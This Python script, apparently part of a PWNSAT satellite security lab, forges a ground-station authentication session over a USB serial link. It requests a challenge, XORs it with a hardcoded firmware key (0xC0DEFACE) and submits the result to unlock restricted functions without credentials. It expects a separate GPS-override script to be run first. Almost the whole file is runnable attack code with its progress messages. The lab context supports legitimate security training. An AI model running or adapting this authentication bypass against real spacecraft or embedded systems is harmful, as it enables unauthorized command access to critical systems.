#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 05_gs_auth_spoofing_usb.py -- forges a valid ground-station auth session
# with no real credentials, over the USB CDC serial link instead of RF. See
# 05_gs_auth_spoofing_rf.py for the full root-cause writeup (a static
# hardcoded XOR "shared key" in the GS_ACCESS handshake,
# gs_shared_auth_key = 0xC0DEFACE).
#
# Same two-phase sequence as the RF version, over a wired link:
#   1. Send GS_ACCESS phase 0x00 ("start") -- ask for a fresh challenge.
#   2. Read the 32-bit challenge from the decrypted reply (offset 5, LE).
#   3. response = challenge XOR 0xC0DEFACE.
#   4. Send GS_ACCESS phase 0x01 ("finish") with that response.
#   5. auth_state 0x01 in the reply => session active (5 min), unlocking
#      GS-gated behavior with no real credential.
#
# PREREQUISITE -- GPS RANGE GATE: same as the RF version, run
# 00_gps_override_prereq_usb.py first. This does NOT inject GPS on its own.

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "PWNSAT-C3" / "pwnsat_tools"))

from flatsat_usb import FlatSatUSB  # noqa: E402
from pwnsat_packets import decode_packet, decrypt_payload  # noqa: E402

GS_ACCESS_APID = 0x12
GS_SHARED_AUTH_KEY = 0xC0DEFACE  # New-firmware/worker.cpp's gs_shared_auth_key, verbatim


def parse_gs_access_tm(raw: bytes) -> dict:
    """Same layout as the RF version's parse_gs_access_tm() -- see
    telemetrySPPTransmitGroundAccessStatus() in worker.cpp:
    spacecraft_id(1) phase(1) auth_state(1) gs_status(1) gps_status(1)
    challenge(u32 LE) session_remaining_s(u16 LE) handshake_remaining_s(u16 LE)."""
    pkt = decode_packet(raw)
    plain = decrypt_payload(pkt.data)
    if len(plain) < 13:
        raise ValueError(f"GS_ACCESS TM payload too short: {len(plain)} bytes")
    return {
        "spacecraft_id": plain[0],
        "phase": plain[1],
        "auth_state": plain[2],
        "gs_status": plain[3],
        "gps_status": plain[4],
        "challenge": int.from_bytes(plain[5:9], "little"),
        "session_remaining_s": int.from_bytes(plain[9:11], "little"),
        "handshake_remaining_s": int.from_bytes(plain[11:13], "little"),
        "sequence_count": pkt.sequence_count,
    }


def find_gs_access_reply(packets: list[bytes], verbose: bool):
    for raw in packets:
        try:
            pkt = decode_packet(raw)
        except ValueError:
            continue
        if pkt.apid != GS_ACCESS_APID:
            continue
        try:
            return parse_gs_access_tm(raw)
        except ValueError as exc:
            if verbose:
                print(f"    (GS_ACCESS-shaped frame, couldn't parse: {exc})")
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--auth-key", type=lambda x: int(x, 0), default=GS_SHARED_AUTH_KEY,
                        help=f"the 'shared' key to forge with (default 0x{GS_SHARED_AUTH_KEY:08X}, "
                             f"gs_shared_auth_key verbatim from worker.cpp -- pass a different "
                             f"value to prove the point that ANY wrong guess fails cleanly)")
    parser.add_argument("--seq", type=int, default=1, help="starting SPP sequence count")
    parser.add_argument("--listen-seconds", type=float, default=1.5,
                        help="how long to wait after each send for the reply")
    parser.add_argument("--retries", type=int, default=3,
                        help="attempts per phase before giving up (unexpected over a wired "
                             "link, but kept for parity with the RF version)")
    parser.add_argument("--port", default=None,
                        help="serial port for the USBRadioLink (default: autodetect)")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    print("=" * 66)
    print("PWNSAT GS auth spoofing (USB) -- forging a session with the hardcoded")
    print(f"gs_shared_auth_key (0x{args.auth_key:08X}), no real credentials involved.")
    print("Prerequisite: run 00_gps_override_prereq_usb.py first.")
    print("=" * 66)

    with FlatSatUSB(port=args.port, encrypt=True, verbose=not args.quiet) as fsat:

        # --- Phase 0x00: request a challenge ---
        challenge = None
        for attempt in range(1, args.retries + 1):
            print(f"\n[*] Phase 0x00 -- requesting a challenge (attempt {attempt}/{args.retries})...")
            _raw, _framed, packets = fsat.send_tc(
                "gs-auth", seq=args.seq + attempt - 1, handshake="start",
                listen_seconds=args.listen_seconds,
            )
            reply = find_gs_access_reply(packets, verbose=not args.quiet)
            if reply is None:
                print("    -> no GS_ACCESS reply captured, retrying...")
                continue
            if reply["auth_state"] != 0x00:
                print(f"    -> FlatSat rejected the challenge request: auth_state=0x{reply['auth_state']:02X} "
                      f"gs_status=0x{reply['gs_status']:02X} gps_status=0x{reply['gps_status']:02X} "
                      f"-- likely GS RANGE LOCK or GS ACCESS GPS (see steps_usb.txt's PREREQUISITE note)")
                sys.exit(1)
            challenge = reply["challenge"]
            print(f"    -> challenge issued: 0x{challenge:08X} "
                  f"(handshake window: {reply['handshake_remaining_s']}s)")
            break
        if challenge is None:
            print("\n[!] Never got a challenge back after all retries -- aborting.")
            sys.exit(1)

        # --- Forge the response ---
        response = (challenge ^ args.auth_key) & 0xFFFFFFFF
        print(f"\n[*] Forged response = challenge XOR auth_key = "
              f"0x{challenge:08X} ^ 0x{args.auth_key:08X} = 0x{response:08X}")

        # --- Phase 0x01: submit the forged response ---
        session_confirmed = False
        explicit_rejection = False
        for attempt in range(1, args.retries + 1):
            print(f"\n[*] Phase 0x01 -- submitting forged response (attempt {attempt}/{args.retries})...")
            _raw, _framed, packets = fsat.send_tc(
                "gs-auth", seq=args.seq + 10 + attempt, handshake="finish",
                challenge=challenge, auth_key=args.auth_key,
                listen_seconds=args.listen_seconds,
            )
            reply = find_gs_access_reply(packets, verbose=not args.quiet)
            if reply is None:
                print("    -> no GS_ACCESS reply captured, retrying...")
                continue
            if reply["auth_state"] == 0x01:
                print(f"    -> ACCEPTED. Session active for {reply['session_remaining_s']}s "
                      f"-- forged, no real credentials ever used.")
                session_confirmed = True
            else:
                print(f"    -> rejected: auth_state=0x{reply['auth_state']:02X} "
                      f"(0x02=AUTH FAIL, 0x03=NO CHALLENGE PENDING)")
                explicit_rejection = True
            break

    print("\n" + "=" * 66)
    if session_confirmed:
        print("[+] GS auth session forged successfully.")
    elif explicit_rejection:
        print("[!] FlatSat explicitly rejected the forged response -- see auth_state above.")
    else:
        print("[?] No confirmation captured -- unexpected over a wired link, check the "
              "connection. GS_STATUS does not update on its own -- request it explicitly "
              "(PWNSAT-C3's 'gs-status' command/button) before assuming this failed.")
    print("=" * 66)


if __name__ == "__main__":
    main()
